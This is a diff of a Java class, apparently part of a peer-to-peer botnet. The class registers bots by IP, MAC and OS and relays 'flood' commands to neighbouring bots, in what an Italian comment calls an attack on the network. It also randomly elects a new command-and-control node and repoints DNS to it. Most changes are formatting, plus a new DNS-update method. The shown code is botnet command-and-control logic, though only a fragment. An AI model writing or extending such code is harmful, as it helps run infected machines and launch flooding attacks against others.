@@ -55,13 +55,13 @@ public class Commando {
 
 	@Autowired
 	private BotRequest bReq;
-	
+
 	@Autowired
 	private BotServiceImpl bServ;
-	
+
 	@Autowired
 	private RoleServiceImpl rServ;
-	
+
 	@Autowired
 	private UserServiceImpl uServ;
 
@@ -77,7 +77,7 @@ public class Commando {
 	private CryptoUtils crypto;
 
 	private String newKing;
-	
+
 	/**
 	 * 
 	 */
@@ -90,7 +90,7 @@ public class Commando {
 	 */
 	public void initializeCeC() {
 		nServ.updateDnsInformation();
-		//TODO impostare vicinato cc
+		// TODO impostare vicinato cc
 		newKing = nServ.getMyIp().toString();
 		pServ.initP2P();
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
@@ -99,7 +99,6 @@ public class Commando {
 		bServ.save(bot);
 	}
 
-	
 	/**
 	 * @param idBot
 	 * @return
@@ -130,8 +129,7 @@ public class Commando {
 				Bot bot;
 				bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
 						objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
-						objects.get(6).toString(), objects.get(8).toString(),
-						objects.get(9).toString());
+						objects.get(6).toString(), objects.get(8).toString(), objects.get(9).toString());
 				bServ.save(bot);
 			}
 		}
@@ -149,7 +147,7 @@ public class Commando {
 	 * @throws NoSuchAlgorithmException
 	 * @throws InvalidKeyException
 	 */
-	public byte[] getNeighbours(String data){
+	public byte[] getNeighbours(String data) {
 		return pServ.getNeighbours(data);
 	}
 
@@ -163,6 +161,10 @@ public class Commando {
 	// un
 	// bot, attacco per la rete)
 
+	/**
+	 * @param cmd
+	 * @param userSSoID
+	 */
 	@Async
 	public void flooding(String cmd, String userSSoID) {
 
@@ -192,33 +194,53 @@ public class Commando {
 		return;
 	}
 
+	/**
+	 * @return
+	 */
+	public boolean newKingDns() {
+		Bot b = bServ.searchBotIP(newKing);
+		if (b != null) {
+			System.out.println("bot dns"+ b.getIp());
+			return nServ.updateDnsInformation(new IP(newKing),b.getPubKey());
+			
+		}
+		return false;
+	}
+
+	/**
+	 * @param msg
+	 */
 	public void startFlood(String msg) {
 		nServ.getNeighbours().getList().forEach((pairs) -> {
 			ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
 		});
 	}
 
-	@Async //forse inutile perche siamo sul thread nostro
+	/**
+	 * 
+	 */
+	@Async // forse inutile perche siamo sul thread nostro
 	public void startElection() {
 		List<Bot> botList = bServ.findAll();
-	
+
 		List<String> ccList = new ArrayList<>();
-		if (botList!=null){
+		if (botList != null) {
 			for (Bot bot : botList) {
-				if(bot.getElegible().equals("true"))
+				if (bot.getElegible().equals("true"))
 					ccList.add(bot.getIp());
 			}
 			System.out.println(ccList.remove(nServ.getMyIp().toString()));
-			if(ccList.size()>0){
-			String ip = ccList.get((int) Math.ceil(Math.random()*(ccList.size()-1)));
-			System.out.println("ho eletto "+ip);
-			if(ccReq.becameCc(ip)){
-				newKing = ip;
-			}
-			System.out.println("erection completed ");
-			} else System.out.println("nessuno da eleggere");
-		//elegilo passa i dati
-		// passa il potere	
+			if (ccList.size() > 0) {
+				String ip = ccList.get((int) Math.ceil(Math.random() * (ccList.size() - 1)));
+				System.out.println("ho eletto " + ip);
+				if (ccReq.becameCc(ip)) {
+					newKing = ip;
+				}
+				System.out.println("erection completed ");
+			} else
+				System.out.println("nessuno da eleggere");
+			// elegilo passa i dati
+			// passa il potere
 		}
 	}
 
